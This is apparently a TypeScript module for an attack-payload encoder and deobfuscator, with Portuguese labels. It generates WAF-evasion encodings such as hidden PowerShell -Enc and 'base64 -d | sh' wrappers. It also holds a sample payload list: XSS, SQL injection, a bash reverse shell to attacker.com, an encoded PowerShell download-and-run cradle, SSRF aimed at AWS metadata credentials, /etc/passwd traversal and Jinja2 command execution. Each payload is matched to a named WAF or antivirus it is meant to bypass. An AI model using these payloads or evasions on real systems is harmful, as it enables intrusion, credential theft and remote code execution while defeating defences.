export interface EncodedVariants {
  plain: string;
  // URL variants
  urlEncode: string;
  doubleUrlEncode: string;
  tripleUrlEncode: string;
  fullUrlEncode: string;
  urlPathTraversal: string;

  // Base64 variants
  base64: string;
  base64Url: string;
  base64EvalJs: string;
  base64DataUri: string;
  base64Bash: string;
  powershellBase64: string;
  phpBase64Filter: string;

  // Hex variants
  hexSlashX: string;
  hex0x: string;
  hexSqlLiteral: string;
  hexSpace: string;
  hexRaw: string;
  hexUrlFormat: string;
  hexByteArray: string;

  // Obfuscation & Bypass variants
  htmlEntityDecimal: string;
  htmlEntityHex: string;
  unicodeEscape: string;
  sqlChar: string;
  caseAlternating: string;
  sqlCommentSpaces: string;
  urlPlusSpaces: string;
  rot13: string;
}

export interface DeobfuscationStep {
  stepNumber: number;
  formatDetected: string;
  description: string;
  output: string;
  entropy: number;
}

export interface DetectedEncodingInfo {
  format: 'base64' | 'url' | 'hex' | 'html' | 'unicode' | 'rot13' | 'plain';
  confidence: 'HIGH' | 'MEDIUM' | 'LOW';
  label: string;
  reason: string;
}

export interface SampleAttackPayload {
  id: string;
  name: string;
  category: 'XSS' | 'SQLi' | 'RCE' | 'SSRF' | 'LFI' | 'SSTI';
  description: string;
  payload: string;
  recommendedEvasion: string;
  wafTarget: string;
}

/**
 * Calculates Shannon entropy of a string (bits per symbol, 0.0 - 8.0)
 * High entropy (> 4.5 - 5.0) typically indicates packed, compressed, encoded or encrypted payload.
 */
export function calculateShannonEntropy(str: string): number {
  if (!str || str.length === 0) return 0;
  const len = str.length;
  const frequencies: Record<string, number> = {};

  for (let i = 0; i < len; i++) {
    const char = str[i];
    frequencies[char] = (frequencies[char] || 0) + 1;
  }

  let entropy = 0;
  for (const char in frequencies) {
    const p = frequencies[char] / len;
    entropy -= p * Math.log2(p);
  }

  return parseFloat(entropy.toFixed(3));
}

/**
 * Heuristic detector for obfuscated string formats (Base64, URL, Hex, Unicode, etc.)
 */
export function detectPayloadEncoding(input: string): DetectedEncodingInfo[] {
  const trimmed = input.trim();
  const detections: DetectedEncodingInfo[] = [];

  if (!trimmed) return detections;

  // Check URL encoding
  const urlMatches = trimmed.match(/%[0-9a-fA-F]{2}/g);
  if (urlMatches && urlMatches.length > 0) {
    const ratio = (urlMatches.length * 3) / trimmed.length;
    const isDoubleUrl = /%25[0-9a-fA-F]{2}/i.test(trimmed);
    detections.push({
      format: 'url',
      confidence: isDoubleUrl ? 'HIGH' : ratio > 0.3 ? 'HIGH' : 'MEDIUM',
      label: isDoubleUrl ? 'Double URL Encoding (%25xx)' : 'URL Encoding (%xx)',
      reason: `${urlMatches.length} sequências hexadecimais de escape URL encontradas.`
    });
  }

  // Check Base64 (Standard & URL Safe)
  const isBase64CharsOnly = /^[A-Za-z0-9+/=_-]+$/.test(trimmed);
  if (isBase64CharsOnly && trimmed.length >= 8) {
    try {
      const sanitized = trimmed.replace(/-/g, '+').replace(/_/g, '/');
      const padded = sanitized.padEnd(sanitized.length + ((4 - (sanitized.length % 4)) % 4), '=');
      const decoded = atob(padded);
      // If it decodes without throwing and contains printable ASCII
      const printableCount = decoded.split('').filter(c => c.charCodeAt(0) >= 32 && c.charCodeAt(0) <= 126).length;
      if (printableCount / decoded.length > 0.65) {
        detections.push({
          format: 'base64',
          confidence: trimmed.endsWith('=') || trimmed.length % 4 === 0 ? 'HIGH' : 'MEDIUM',
          label: 'Base64 (RFC 4648 / URL-Safe)',
          reason: `Decodificação válida com ${Math.round((printableCount / decoded.length) * 100)}% de caracteres ASCII legíveis.`
        });
      }
    } catch {
      // Not base64
    }
  }

  // Check Hex (e.g. \x41, 0x41, or raw hex 414243...)
  const hasSlashX = /\\x[0-9a-fA-F]{2}/i.test(trimmed);
  const has0x = /0x[0-9a-fA-F]{2}/i.test(trimmed);
  const isRawHex = /^[0-9a-fA-F]{8,}$/i.test(trimmed) && trimmed.length % 2 === 0;

  if (hasSlashX || has0x || isRawHex) {
    detections.push({
      format: 'hex',
      confidence: hasSlashX || has0x ? 'HIGH' : isRawHex ? 'MEDIUM' : 'LOW',
      label: hasSlashX ? 'Hex C-Style Escaped (\\x..)' : has0x ? 'Hex Literal (0x..)' : 'Raw Contiguous Hex',
      reason: hasSlashX
        ? 'Padrão explícito \\x.. de injeção de shellcode/bytes.'
        : has0x
        ? 'Prefixo 0x comum em bypasses de SQL Injection.'
        : 'Cadeia de bytes hexadecimais contíguos de tamanho par.'
    });
  }

  // Check HTML Entities
  if (/&#(?:[0-9]+|x[0-9a-fA-F]+);/i.test(trimmed) || /&(?:lt|gt|quot|amp);/i.test(trimmed)) {
    detections.push({
      format: 'html',
      confidence: 'HIGH',
      label: 'HTML Entities (Decimal/Hex)',
      reason: 'Sequências de entidades HTML para bypass de sanitizadores DOM/XSS.'
    });
  }

  // Check Unicode escapes
  if (/\\u[0-9a-fA-F]{4}/i.test(trimmed)) {
    detections.push({
      format: 'unicode',
      confidence: 'HIGH',
      label: 'Unicode Escape (\\u00xx)',
      reason: 'Sequências de escape Unicode para evasão em analisadores JSON/JavaScript.'
    });
  }

  if (detections.length === 0) {
    detections.push({
      format: 'plain',
      confidence: 'HIGH',
      label: 'Texto em Claro / Formato Desconhecido',
      reason: 'Nenhum padrão óbvio de codificação primária detectado.'
    });
  }

  return detections;
}

/**
 * Computes all real-time encodings and evasions for an input string
 */
export function computeAllEncodings(input: string): EncodedVariants {
  const plain = input;

  // URL Encodings
  let urlEncode = '';
  let doubleUrlEncode = '';
  let tripleUrlEncode = '';
  let fullUrlEncode = '';
  let urlPathTraversal = '';

  try {
    urlEncode = encodeURIComponent(plain);
    doubleUrlEncode = encodeURIComponent(urlEncode);
    tripleUrlEncode = encodeURIComponent(doubleUrlEncode);
    // Full URL encode every single character
    fullUrlEncode = plain
      .split('')
      .map(char => '%' + char.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase())
      .join('');
    // Path traversal bypass (../ -> ..%2f or %2e%2e%2f)
    urlPathTraversal = plain
      .replace(/\.\.\//g, '..%2f')
      .replace(/\.\.\\/g, '..%5c')
      .replace(/\.\.\//g, '%2e%2e%2f');
  } catch {
    urlEncode = plain;
    doubleUrlEncode = plain;
    tripleUrlEncode = plain;
    fullUrlEncode = plain;
    urlPathTraversal = plain;
  }

  // Base64 Encodings
  let base64 = '';
  let base64Url = '';
  let base64EvalJs = '';
  let base64DataUri = '';
  let base64Bash = '';
  let powershellBase64 = '';
  let phpBase64Filter = '';

  try {
    const utf8Bytes = encodeURIComponent(plain).replace(/%([0-9A-F]{2})/g, (_, p1) =>
      String.fromCharCode(parseInt(p1, 16))
    );
    base64 = btoa(utf8Bytes);
    base64Url = base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    base64EvalJs = `eval(atob('${base64}'))`;
    base64DataUri = `data:text/html;base64,${base64}`;
    base64Bash = `echo '${base64}' | base64 -d | sh`;
    phpBase64Filter = `php://filter/convert.base64-encode/resource=${plain.trim() || 'index.php'}`;

    // PowerShell UTF-16LE Base64
    const utf16Bytes: number[] = [];
    for (let i = 0; i < plain.length; i++) {
      const code = plain.charCodeAt(i);
      utf16Bytes.push(code & 0xff);
      utf16Bytes.push((code >> 8) & 0xff);
    }
    const binary = String.fromCharCode(...utf16Bytes);
    powershellBase64 = `powershell.exe -NoP -NonI -W Hidden -Enc ${btoa(binary)}`;
  } catch {
    base64 = 'Error';
    base64Url = 'Error';
    base64EvalJs = 'Error';
    base64DataUri = 'Error';
    base64Bash = 'Error';
    powershellBase64 = 'Error';
    phpBase64Filter = 'Error';
  }

  // Hex variations
  let hexSlashX = '';
  let hex0x = '';
  let hexSqlLiteral = '';
  let hexSpace = '';
  let hexRaw = '';
  let hexUrlFormat = '';
  let hexByteArray = '';

  try {
    const hexArr: string[] = [];
    for (let i = 0; i < plain.length; i++) {
      const h = plain.charCodeAt(i).toString(16).padStart(2, '0').toLowerCase();
      hexArr.push(h);
    }
    hexSlashX = hexArr.map(h => '\\x' + h).join('');
    hex0x = hexArr.map(h => '0x' + h).join(' ');
    hexSqlLiteral = '0x' + hexArr.join('');
    hexSpace = hexArr.join(' ');
    hexRaw = hexArr.join('');
    hexUrlFormat = hexArr.map(h => '%' + h.toUpperCase()).join('');
    hexByteArray = hexArr.map(h => '0x' + h).join(', ');
  } catch {
    hexSlashX = 'Error';
    hex0x = 'Error';
    hexSqlLiteral = 'Error';
    hexSpace = 'Error';
    hexRaw = 'Error';
    hexUrlFormat = 'Error';
    hexByteArray = 'Error';
  }

  // Obfuscations & Bypasses
  let htmlEntityDecimal = '';
  let htmlEntityHex = '';
  let unicodeEscape = '';
  let sqlChar = '';
  let caseAlternating = '';
  let sqlCommentSpaces = '';
  let urlPlusSpaces = '';
  let rot13 = '';

  try {
    for (let i = 0; i < plain.length; i++) {
      const code = plain.charCodeAt(i);
      htmlEntityDecimal += `&#${code};`;
      htmlEntityHex += `&#x${code.toString(16)};`;
      unicodeEscape += `\\u${code.toString(16).padStart(4, '0')}`;
    }

    // SQL CHAR(...)
    const codes: number[] = [];
    for (let i = 0; i < plain.length; i++) {
      codes.push(plain.charCodeAt(i));
    }
    sqlChar = `CHAR(${codes.join(',')})`;

    // Case alternating (sElEcT)
    caseAlternating = plain
      .split('')
      .map((c, i) => (i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()))
      .join('');

    // Spaces to SQL comments /**/
    sqlCommentSpaces = plain.replace(/\s+/g, '/**/');

    // Spaces to +
    urlPlusSpaces = plain.replace(/\s+/g, '+');

    // ROT13
    rot13 = plain.replace(/[a-zA-Z]/g, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
    });
  } catch {
    htmlEntityDecimal = 'Error';
    htmlEntityHex = 'Error';
    unicodeEscape = 'Error';
    sqlChar = 'Error';
    caseAlternating = 'Error';
    sqlCommentSpaces = 'Error';
    urlPlusSpaces = 'Error';
    rot13 = 'Error';
  }

  return {
    plain,
    urlEncode,
    doubleUrlEncode,
    tripleUrlEncode,
    fullUrlEncode,
    urlPathTraversal,
    base64,
    base64Url,
    base64EvalJs,
    base64DataUri,
    base64Bash,
    powershellBase64,
    phpBase64Filter,
    hexSlashX,
    hex0x,
    hexSqlLiteral,
    hexSpace,
    hexRaw,
    hexUrlFormat,
    hexByteArray,
    htmlEntityDecimal,
    htmlEntityHex,
    unicodeEscape,
    sqlChar,
    caseAlternating,
    sqlCommentSpaces,
    urlPlusSpaces,
    rot13
  };
}

/**
 * Decodes a payload based on specified format
 */
export function decodePayload(
  input: string,
  format: 'url' | 'base64' | 'hex' | 'html' | 'unicode' | 'rot13'
): string {
  const trimmed = input.trim();
  if (!trimmed) return '';

  try {
    if (format === 'url') {
      // Decode recursively if double/triple encoded
      let res = trimmed;
      try {
        res = decodeURIComponent(res);
      } catch {
        // partial unescape
        res = unescape(res);
      }
      return res;
    } else if (format === 'base64') {
      // Remove wrapper if present e.g. eval(atob('...')) or echo '...' | base64 -d
      let cleaned = trimmed;
      const atobMatch = trimmed.match(/atob\(['"]([A-Za-z0-9+/=_-]+)['"]\)/i);
      if (atobMatch) cleaned = atobMatch[1];
      const echoMatch = trimmed.match(/echo\s+['"]([A-Za-z0-9+/=_-]+)['"]\s*\|\s*base64/i);
      if (echoMatch) cleaned = echoMatch[1];

      let b64 = cleaned.replace(/-/g, '+').replace(/_/g, '/');
      while (b64.length % 4 !== 0) b64 += '=';
      const binaryStr = atob(b64);
      // Try utf-8 decoding
      try {
        const bytes = new Uint8Array(binaryStr.length);
        for (let i = 0; i < binaryStr.length; i++) {
          bytes[i] = binaryStr.charCodeAt(i);
        }
        return new TextDecoder('utf-8').decode(bytes);
      } catch {
        return binaryStr;
      }
    } else if (format === 'hex') {
      // Clean 0x, \x, %, commas, spaces
      const cleanHex = trimmed
        .replace(/0x/gi, '')
        .replace(/\\x/gi, '')
        .replace(/%/g, '')
        .replace(/,\s*/g, '')
        .replace(/\s+/g, '');

      if (!/^[0-9a-fA-F]+$/.test(cleanHex)) {
        return '[Erro: Caracteres hexadecimais inválidos encontrados]';
      }

      let str = '';
      for (let i = 0; i < cleanHex.length; i += 2) {
        str += String.fromCharCode(parseInt(cleanHex.substr(i, 2), 16));
      }
      return str;
    } else if (format === 'html') {
      const doc = new DOMParser().parseFromString(trimmed, 'text/html');
      return doc.documentElement.textContent || trimmed;
    } else if (format === 'unicode') {
      return trimmed.replace(/\\u([0-9a-fA-F]{4})/gi, (_, hex) =>
        String.fromCharCode(parseInt(hex, 16))
      );
    } else if (format === 'rot13') {
      return trimmed.replace(/[a-zA-Z]/g, c => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      });
    }
  } catch (e: any) {
    return `[Falha na decodificação: ${e?.message || 'Formato incompatível'}]`;
  }

  return trimmed;
}

/**
 * Recursively peels nested obfuscation layers (e.g. URL -> Base64 -> Hex -> Plain text)
 */
export function recursiveDeobfuscate(input: string, maxLayers = 5): DeobfuscationStep[] {
  const steps: DeobfuscationStep[] = [];
  let current = input.trim();

  steps.push({
    stepNumber: 0,
    formatDetected: 'Original',
    description: 'Entrada bruta fornecida',
    output: current,
    entropy: calculateShannonEntropy(current)
  });

  for (let layer = 1; layer <= maxLayers; layer++) {
    const detections = detectPayloadEncoding(current);
    const top = detections[0];

    if (!top || top.format === 'plain') {
      break;
    }

    let decoded = '';
    let formatName = '';

    if (top.format === 'url') {
      decoded = decodePayload(current, 'url');
      formatName = 'URL Decode';
    } else if (top.format === 'base64') {
      decoded = decodePayload(current, 'base64');
      formatName = 'Base64 Decode';
    } else if (top.format === 'hex') {
      decoded = decodePayload(current, 'hex');
      formatName = 'Hex Decode';
    } else if (top.format === 'unicode') {
      decoded = decodePayload(current, 'unicode');
      formatName = 'Unicode Decode';
    } else if (top.format === 'html') {
      decoded = decodePayload(current, 'html');
      formatName = 'HTML Entities Decode';
    } else {
      break;
    }

    // If decoding didn't alter output or resulted in error, stop
    if (!decoded || decoded === current || decoded.startsWith('[Falha') || decoded.startsWith('[Erro')) {
      break;
    }

    current = decoded;
    steps.push({
      stepNumber: layer,
      formatDetected: formatName,
      description: `Camada ${layer} desofuscada com sucesso (${top.label})`,
      output: current,
      entropy: calculateShannonEntropy(current)
    });
  }

  return steps;
}

export const SAMPLE_ENCODER_PAYLOADS: SampleAttackPayload[] = [
  {
    id: 'xss-svg-1',
    name: 'XSS: SVG OnLoad (Moderna Evasão)',
    category: 'XSS',
    description: 'Bypass de filtros que bloqueiam tags <script> tradicionais.',
    payload: '<svg onload=alert(document.domain)>',
    recommendedEvasion: 'Full URL Encode (%XX) ou Hex C-Style (\\x..)',
    wafTarget: 'AWS WAF / Cloudflare XSS Ruleset'
  },
  {
    id: 'xss-img-2',
    name: 'XSS: Img OnError Prompt',
    category: 'XSS',
    description: 'Dispara callback com prompt() através do erro de carregamento da imagem.',
    payload: '"><img src=x onerror=prompt(1)>',
    recommendedEvasion: 'HTML Entities Hex (&#x..) ou Double URL (%2520)',
    wafTarget: 'Akamai Kona / Imperva'
  },
  {
    id: 'sqli-union-1',
    name: 'SQLi: UNION SELECT com Hex String',
    category: 'SQLi',
    description: 'Injeção UNION com strings em hexadecimal puro (0x..) para evitar aspas simples.',
    payload: "1' UNION SELECT 1,0x61646d696e,0x736563726574,4 FROM users-- -",
    recommendedEvasion: 'SQL Comment Spaces (/**/) + SQL Hex Literal',
    wafTarget: 'ModSecurity OWASP CRS'
  },
  {
    id: 'sqli-blind-2',
    name: 'SQLi: Sleep Time-Based Blind',
    category: 'SQLi',
    description: 'Injeção temporal com randomização de maiúsculas/minúsculas.',
    payload: "1'; WAITFOR DELAY '0:0:5'--",
    recommendedEvasion: 'Case Alternating (sElEcT) + URL Encode',
    wafTarget: 'Azure WAF / F5 BIG-IP'
  },
  {
    id: 'rce-bash-1',
    name: 'RCE: Base64 Piping Reverse Shell',
    category: 'RCE',
    description: 'Encaminhamento de comando Linux através de decodificação Base64 em pipe.',
    payload: '; echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" | base64 -d | bash #',
    recommendedEvasion: 'Base64 Bash Pipeline + Double URL Encode',
    wafTarget: 'Linux Host IDS / Snort / Suricata'
  },
  {
    id: 'rce-ps-2',
    name: 'RCE: PowerShell EncodedCommand',
    category: 'RCE',
    description: 'Execução de scriptlet Windows disfarçado com codificação UTF-16LE.',
    payload: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBzAC4AcABzADEAJwApAA==',
    recommendedEvasion: 'PowerShell UTF-16LE Base64',
    wafTarget: 'Microsoft Defender / AMSI'
  },
  {
    id: 'ssrf-meta-1',
    name: 'SSRF: AWS Instance Metadata IMDSv1',
    category: 'SSRF',
    description: 'Coleta de credenciais temporárias IAM na rota de metadados da AWS.',
    payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    recommendedEvasion: 'Decimal IP (2852039166) ou Hex IP (0xa9fea9fe)',
    wafTarget: 'Cloud Egress Filters'
  },
  {
    id: 'lfi-trav-1',
    name: 'LFI: Path Traversal com Evasão Dupla',
    category: 'LFI',
    description: 'Leitura arbitrária de /etc/passwd com traversal codificado.',
    payload: '../../../../../../../../etc/passwd',
    recommendedEvasion: 'Double URL Traversal (..%252f) ou Overlong UTF-8',
    wafTarget: 'NGINX / Apache Directory Hardening'
  },
  {
    id: 'ssti-jinja-1',
    name: 'SSTI: Jinja2 MRO Globals RCE',
    category: 'SSTI',
    description: 'Injeção de template com hex escapes para invocar subprocess.Popen.',
    payload: "{{''.__class__.__mro__[1].__subclasses__()[132]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0]}}",
    recommendedEvasion: 'Hex Escapes (\\x5f\\x5f) para evitar filtros de underscore',
    wafTarget: 'Python Web Frameworks / Flask'
  }
];
